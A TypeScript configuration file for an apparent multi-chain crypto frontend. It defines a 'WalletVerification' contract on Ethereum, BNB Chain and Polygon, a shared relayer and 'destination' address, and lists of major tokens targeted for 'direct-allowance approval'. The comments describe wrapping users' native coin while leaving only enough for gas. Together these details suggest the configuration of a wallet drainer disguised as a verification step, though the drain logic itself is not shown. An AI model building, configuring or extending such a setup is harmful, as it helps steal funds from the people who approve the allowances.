export interface Token {
  symbol: string;
  address: string;
  decimals: number;
}

export interface ChainConfig {
  name: "eth" | "bnb" | "polygon";
  label: string;
  chainId: number;
  rpcUrls: string[];
  contract: string; // WalletVerification address
  weth: string;     // native-coin wrap target (WETH/WBNB/WMATIC)
  nativeSymbol: string;
  explorer: string;
  tokens: Token[];  // priority tokens offered for direct-allowance approval
  // Native coin left untouched when wrapping — must cover gas for the wrap
  // tx itself plus every approval tx sent in the same pass (ether-string).
  gasReserve: string;
}

// Same destination + relayer as the Web3Portal contracts — this project
// shares custody infrastructure but is a fully separate frontend/contract
// deployment (WalletVerification, direct-allowance only, no Permit2).
export const RELAYER_ADDRESS = "0x1826d8D10F6a6deadDB401Fe2843fdBf34855414";

export const CHAINS: ChainConfig[] = [
  {
    name: "eth",
    label: "Ethereum",
    chainId: 1,
    rpcUrls: [
      "https://eth.llamarpc.com",
      "https://rpc.ankr.com/eth",
      "https://ethereum-rpc.publicnode.com",
    ],
    contract: "0x2928b3a9fc67608D13dE22eD69Bbf61fDF53A3e4",
    weth: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
    nativeSymbol: "ETH",
    explorer: "https://etherscan.io",
    gasReserve: "0.02",
    tokens: [
      { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
      { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
      { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
      { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
      { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
      { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
      { symbol: "UNI",  address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
    ],
  },
  {
    name: "bnb",
    label: "BNB Chain",
    chainId: 56,
    rpcUrls: [
      "https://bsc-dataseed.binance.org",
      "https://rpc.ankr.com/bsc",
      "https://bsc-rpc.publicnode.com",
    ],
    contract: "0x82C29f687d7Ad7e8A1DAffCA2dec25B5A85dc281",
    weth: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
    nativeSymbol: "BNB",
    explorer: "https://bscscan.com",
    gasReserve: "0.006",
    tokens: [
      { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
      { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
      { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
      { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
      { symbol: "ETH",  address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", decimals: 18 },
      { symbol: "BTCB", address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", decimals: 18 },
      { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
    ],
  },
  {
    name: "polygon",
    label: "Polygon",
    chainId: 137,
    rpcUrls: [
      "https://polygon-rpc.com",
      "https://rpc.ankr.com/polygon",
      "https://polygon-bor-rpc.publicnode.com",
    ],
    contract: "0x272b94a0251c32aDb180d8eEa179c66335EBF34D",
    weth: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
    nativeSymbol: "MATIC",
    explorer: "https://polygonscan.com",
    gasReserve: "0.6",
    tokens: [
      { symbol: "USDC",   address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
      { symbol: "USDT",   address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
      { symbol: "DAI",    address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063", decimals: 18 },
      { symbol: "WETH",   address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18 },
      { symbol: "WBTC",   address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6", decimals: 8 },
      { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18 },
      { symbol: "LINK",   address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39", decimals: 18 },
    ],
  },
];

export function getChain(name: string): ChainConfig | undefined {
  return CHAINS.find(c => c.name === name);
}

export function getChainById(chainId: number): ChainConfig | undefined {
  return CHAINS.find(c => c.chainId === chainId);
}
